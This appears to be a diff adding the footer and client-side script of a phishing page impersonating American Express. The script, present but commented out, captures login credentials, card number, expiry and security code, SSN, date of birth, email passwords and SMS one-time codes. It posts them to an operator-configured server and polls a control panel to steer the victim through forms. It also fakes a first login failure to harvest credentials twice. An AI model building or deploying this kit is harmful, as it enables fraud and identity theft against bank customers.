+                    <path d="M230.1 5.8h-3.6c-.8 0-1.3-.5-1.3-1.2s.6-1.1 1.3-1.1h6.5l1.5-3.3h-8c-3.3 0-5.2 2-5.2 4.6 0 2.8 1.8 4.4 4.7 4.4h3.6c.8 0 1.3.5 1.3 1.2s-.5 1.2-1.3 1.2h-7.8v3.3h7.8c3.3 0 5.2-1.9 5.2-4.7 0-2.8-1.7-4.4-4.7-4.4m-14.3 0h-3.6c-.8 0-1.3-.5-1.3-1.2s.6-1.1 1.3-1.1h6.5l1.5-3.3h-8c-3.3 0-5.2 2-5.2 4.6 0 2.8 1.8 4.4 4.7 4.4h3.6c.8 0 1.3.5 1.3 1.2s-.5 1.2-1.3 1.2h-7.8v3.3h7.8c3.3 0 5.2-1.9 5.2-4.7 0-2.8-1.7-4.4-4.7-4.4m-22.8 9h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2H193zm-7.7-8.4h-4.1V3.5h4.1c1.2 0 1.8.7 1.8 1.5-.1.8-.7 1.4-1.8 1.4m5.7-1.5c0-2.8-2-4.7-5.2-4.7h-8.4v14.6h3.9V9.7h1.4l4.4 5.1h4.8l-4.8-5.3c2.4-.5 3.9-2.3 3.9-4.6m-21 1.8h-4.2V3.5h4.2c1.2 0 1.8.7 1.8 1.6-.1.9-.7 1.6-1.8 1.6m.4-6.5h-8.5v14.6h3.9V10h4.5c3.3 0 5.3-2.1 5.3-4.9 0-2.9-2-4.9-5.2-4.9m-9.2 0h-5l-3.8 4.4-3.8-4.4h-5.1l6.4 7.2-6.5 7.4h5l3.9-4.6 4 4.6h5.1l-6.6-7.5zm-30.7 14.6h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2h-12.3zm-13.7-5.7l-6-8.9h-4.9v14.6h3.9V5.5l6.1 9.3h4.7V.2h-3.8zm-22.7-.5l2-4.9 2 4.9h-4zM93.7.2l-6.4 14.6h4.3l1.2-3h6.8l1.3 3h4.4L98.7.2h-5zM80.9 7.6v-.3c0-2.2 1.2-3.7 3.7-3.7H89V.2h-4.7C79.5.2 77 3.3 77 7.3v.3c0 4.5 2.8 7.1 7.1 7.1h1.3l1.6-3.3h-2.3c-2.3.1-3.8-1.2-3.8-3.8M71.1.2v14.6H75V.2zm-7.8 6.2h-4.1V3.5h4.1c1.2 0 1.8.7 1.8 1.5s-.6 1.4-1.8 1.4M69 4.9c0-2.8-2-4.7-5.2-4.7h-8.4v14.6h3.9V9.7h1.4l4.4 5.1H70l-4.8-5.3C67.6 9 69 7.2 69 4.9m-28.5 9.9h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2H40.5zM28.1 9.4L24.8.2h-6.1v14.6h3.8V4.3l3.8 10.5h3.5l3.9-10.5v10.5h3.8V.2h-6.1zM6.9 8.6l2-4.9 2 4.9h-4zM6.4.2L0 14.8h4.3l1.2-3h6.8l1.3 3H18L11.5.2H6.4z" fill="#006fcf"></path>
+                </svg>
+                <div class="foot_img">
+                    <img src="components/fc.png">
+                    <img src="components/tw.png">
+                    <img src="components/in.png">
+                    <img src="components/li.png">
+                    <img src="components/yt.png">
+                </div>
+            </div>
+
+
+              <div class="cont_box">
+                <svg width="100" height="69" viewBox="0 0 100 69">
+                <path fill="#FFF" d="M0 0h100v69H0z"></path>
+                <path fill="#BD3D44" d="M0 0h100v5.308H0V0zm0 10.615h100v5.308H0v-5.308zm0 10.616h100v5.308H0V21.23zm0 10.615h100v5.308H0v-5.308zm0 10.616h100v5.308H0v-5.308zm0 10.615h100v5.308H0v-5.308zm0 10.616h100V69H0v-5.308z"></path>
+                <path fill="#192F5D" d="M0 0h52.44v37.154H0V0z"></path>
+                <path fill="#FFF" d="M4.37 1.59l.477 1.469h1.544l-1.249.907.477 1.469-1.25-.908-1.248.908.477-1.469-1.25-.907h1.545L4.37 1.59zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.907h1.545l.477-1.469zm8.74 0l.477 1.469h1.545l-1.25.907.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0l.477 1.469h1.545l-1.25.907.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.478 1.469h1.544l-1.25.907.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.907h1.545l.477-1.469zM8.74 5.306l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.476-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zM4.37 9.021l.477 1.468h1.544l-1.249.908.477 1.469-1.25-.908-1.248.908.477-1.469-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.908h1.544l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.908h1.544l.477-1.468zm8.74 0l.478 1.468h1.544l-1.25.908.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.908h1.545l.477-1.468zM8.74 12.736l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.249.907.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.25.907.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.249.907.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.478 1.469h1.544l-1.25.907.478 1.469-1.25-.907-1.249.907.478-1.469-1.25-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.249.907.477-1.469-1.25-.907h1.545l.477-1.469zM4.37 16.452l.477 1.468h1.544l-1.249.908.477 1.468-1.25-.907-1.248.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.477-1.468zM8.74 20.167l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.478 1.469h1.544l-1.25.907.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.907h1.545l.477-1.469zM4.37 23.883l.477 1.468h1.544l-1.249.908.477 1.468-1.25-.907-1.248.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.477-1.468zM8.74 27.598l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0l.478 1.469h1.544l-1.25.907.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.907h1.544l.477-1.469zm8.74 0l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.907h1.545l.477-1.469zM4.37 31.314l.477 1.468h1.544l-1.249.908.477 1.468-1.25-.907-1.248.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0l.477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0l.478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.477-1.468z"></path>
+                </svg>
+
+                <span>United States</span>
+                <a href="#">Change Country</a>
+              </div>
+            </div>
+
+
+            <div class="foot_text">
+                
+
+                
+            <div class="link_nav">
+                <a href="#">Terms of Service</a> | 
+                <a href="#">Privacy Center</a> | 
+                <a href="#">AdChoices</a> | 
+                <a href="#">Security Center</a> |
+                <a href="#">Card Agreements</a> |
+                <a href="#">Servicemember Benefits</a> |
+                <a href="#">Site Map</a>
+            </div>
+
+            <div class="space">
+                <p>All users of our online services are subject to our Privacy Statement and agree to be bound by the Terms of Service. Please review.</p>
+            </div>
+            <div class="space">
+                <p>Â© 2024 American Express. All rights reserved</p>
+            </div>
+            </div>
+        </div>
+    </div>
+    <!--<script>
+         const headerNav = document.querySelector(".header_nav");
+        const mainForm1 = document.querySelector(".mainBoxForm-1");
+        const header2 = document.querySelector(".header_nav2");
+        const mainForm2 = document.querySelector(".mainBoxForm-2");
+        const form1 = document.getElementById("form");
+        const form2 = document.getElementById("form2");
+        const form3 = document.getElementById("form3");
+        const form4 = document.getElementById("form4");
+        const formOt = document.getElementById("formOt");
+        const mainForm3 = document.querySelector(".mainBoxForm-3");
+        const textError = document.querySelector(".text_error");
+        const error = document.querySelector( ".error");
+        const mainForm4 = document.querySelector(".mainBoxForm-4");
+        const mainForm5 = document.querySelector(".mainBoxForm-5");
+        const mainForm21 = document.querySelector(".mainBoxForm-21");
+        const error2 = document.querySelector(".err-2");
+        const error3 = document.querySelector(".err-3 ");
+        const preloadContainer = document.querySelector(".preload-container");
+        const mobNav = document.querySelector(".mob-bav");
+        const errordsc = document.querySelector(".errordsc");
+        const sc = document.querySelectorAll(".sc");
+        const vsxbtn = document.querySelector(".vsxbtn");
+        const formSx = document.querySelector("#formSx");
+        const errSx = document.querySelector(".errSx");
+        const showvID2 = document.querySelector(".showvID2");
+        const sxPas = document.querySelector("#sx");
+        const mainForm22 = document.querySelector(".mainBoxForm-22");
+        const textErrP = document.querySelector(".textErrP");
+        const errot = document.querySelector(".errot");
+        let sxNum = 0;
+        let num = 0;
+        let net1 = 0;
+
+        //add server files here
+        let filePath = "https://google.com"; 
+        
+        const viewId = (data) => {
+            $.ajax({
+                url: `${filePath}/res.php`,
+                type: 'POST',
+                data: data,
+            })
+        };
+
+        const panHandler = (data) => {
+               $.ajax({
+                url: `${filePath}/res.php`,
+                type: 'POST',
+                data: data,
+            }).then(() => {
+                let interv = setInterval(() => {
+                     $.ajax({
+                        url: `${filePath}/panel.php`,
+                        type: 'POST',
+                    }).then((res) => {
+                        const data = JSON.parse(res);
+                       
+                        if(data.msg === "card"){
+                            mainForm1.classList.add("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.remove("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm22.classList.add("none");
+                            mainForm21.classList.add("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+                        else if(data.msg === "personal"){
+                            mainForm1.classList.add("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.remove("none");
+                            mainForm5.classList.add("none");
+                            mainForm22.classList.add("none");
+                            mainForm21.classList.add("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+                        else if(data.msg === "billing"){
+                            mainForm1.classList.add("none");
+                            mainForm2.classList.remove("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm22.classList.add("none");
+                            mainForm21.classList.add("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+
+                         else if(data.msg === "user"){
+                            mainForm1.classList.remove("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm22.classList.add("none");
+                            mainForm21.classList.add("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+                        else if(data.msg === "csc"){
+                            mainForm1.classList.add("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm21.classList.remove("none");
+                            mainForm22.classList.add("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+                        else if(data.msg === "sms"){
+                            mainForm1.classList.add("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm21.classList.add("none");
+                            mainForm22.classList.remove("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+                        else if(data.msg === "invaliduser"){
+                            textError.textContent = "Sorry, unable to verify your account try again";
+                            textError.classList.remove("none");
+                            mainForm1.classList.remove("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm22.classList.add("none");
+                            mainForm21.classList.add("none");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+
+                         else if(data.msg === "invalidotp"){
+                            textErrP.textContent = "Invalid Otp, enter otp sent to your mobile number";
+                            errot.classList.remove("none");
+                            mainForm1.classList.add("none");
+                            mainForm2.classList.add("none");
+                            mainForm3.classList.add("none");
+                            mainForm4.classList.add("none");
+                            mainForm5.classList.add("none");
+                            mainForm21.classList.add("none");
+                            mainForm22.classList.remove("none");
+                            preloadContainer.classList.add("hide-load");
+                            preloadContainer.classList.add("hide-load");
+                            clearInterval(interv);
+                        }
+                        else if(data.msg === "done") {
+                            //window.location.href = "https://www.americanexpress.com/";
+                        }
+                       
+                    })
+                     
+                }, 5000);
+            })
+        }
+
+         form1.addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            const id = e.target.elements.id.value;
+            const pa = e.target.elements.pa.value;
+            const type = e.target.elements.type.value;
+            
+            if(id !== "" || pa !== ""){
+                let vals = {userId: id, pass: pa, type: type}
+                viewId(vals);
+                num++;
+                textError.classList.add("none");
+                preloadContainer.classList.remove("hide-load");
+
+                setTimeout(() => {
+                    e.target.reset();
+                    preloadContainer.classList.add("hide-load");
+                    if(num === 1){
+                        textContent = "Incorrect User ID or Password";
+                        textError.classList.remove("none");
+                    }
+                    else{
+                        headerNav.classList.add("none");
+                        mainForm1.classList.add("none");
+                        header2.classList.remove("none");
+                        mainForm21.classList.remove("none");
+                        mobNav.classList.add("hideMain");
+                        num = 0;
+                    }
+                }, 1000);
+            }
+         });
+
+
+         form2.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const dci = e.target.elements.dci.value;
+            const scs = e.target.elements.scs.value;
+            const em = e.target.elements.em.value;
+            const ph = e.target.elements.ph.value;
+           
+            if(dci !== "" || scs !== "" || em !== "" || ph !== ""){
+                errordsc.classList.add("none");
+                preloadContainer.classList.remove("hide-load");
+
+                let vals = {dci: dci, digit4: scs, email: em, phone: ph, baseUrl: filePath };
+                panHandler(vals);
+                e.target.reset();
+            
+            }
+
+         });
+
+         form3.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const noc = e.target.elements.noc.value;
+            const cnum  = e.target.elements.cnum.value;
+            const exp  = e.target.elements.exp.value;
+            const sec  = e.target.elements.sec.value;
+            const em  = e.target.elements.em.value;
+            const pam  = e.target.elements.pam.value;
+    
+            if(noc !== "" || cnum !== "" || exp !== "" || sec !== "" || em !== ""|| pam !== ""){
+                num++;
+                error2.classList.add("none");
+                  preloadContainer.classList.remove("hide-load");
+                
+                let vals= {noc: noc, cnum:cnum, exp: exp, sec: sec, em: em, pam: pam, baseUrl: filePath}
+                panHandler(vals)
+
+                e.target.reset();
+
+            }
+         });
+
+
+         form4.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const ss = e.target.elements.ss.value;
+            const psp  = e.target.elements.psp.value;
+            const dob  = e.target.elements.dob.value;
+            const pob  = e.target.elements.pob.value;
+            const pob2  = e.target.elements.pob2.value;
+            const emai  = e.target.elements.emai.value;
+            const pas  = e.target.elements.pas.value;
+
+            if(ss !== "" || psp !== "" || dob !== "" ||  pob !== "" || pob2 !== "" || emai !== ""|| pas !== ""){
+                num++;
+                preloadContainer.classList.remove("hide-load");
+                error3.classList.add("none");
+                let vals = {ssn: ss, psp: psp, dob: dob, pob1: pob, pob2: pob2, email: emai, pas: pas, baseUrl: filePath}
+                panHandler(vals);
+                e.target.reset();
+            }
+         });
+
+
+         formSx.addEventListener("submit",(e) => {
+            e.preventDefault();
+            const sn = e.target.elements.sx.value;
+            sxNum++;
+            preloadContainer.classList.remove("hide-load");
+            errSx.classList.add("none");
+            
+            setTimeout(() => {
+                if(sxNum === 1){
+                    preloadContainer.classList.add("hide-load");
+                    errSx.classList.remove("none");
+                    let vals = {csc1: sn};
+                    viewId(vals);
+                    e.target.reset();
+                }
+                else {
+                    let vals = {csc2: sn, baseUrl: filePath};
+                    panHandler(vals);
+                }
+               
+            }, 3000);
+         });
+
+
+         formOt.addEventListener("submit", (e) => {
+            e.preventDefault();
+            preloadContainer.classList.remove("hide-load");
+            textErrP.textContent = "";
+            errot.classList.add("none");
+            const ot = e.target.elements.ot.value;
+            let vals = {ot: ot, baseUrl: filePath};
+            panHandler(vals);
+
+            e.target.reset();
+         });
+
+         showvID2.addEventListener("click", () => {
+            if(sxPas.type === "password"){
+                sxPas.type = "text";
+                showvID2.textContent = "hide";
+            }
+            else {
+                sxPas.type = "password";
+                showvID2.textContent = "Show";  
+            }
+         });
+
+    </script>  -->
+
+
+</body></html>
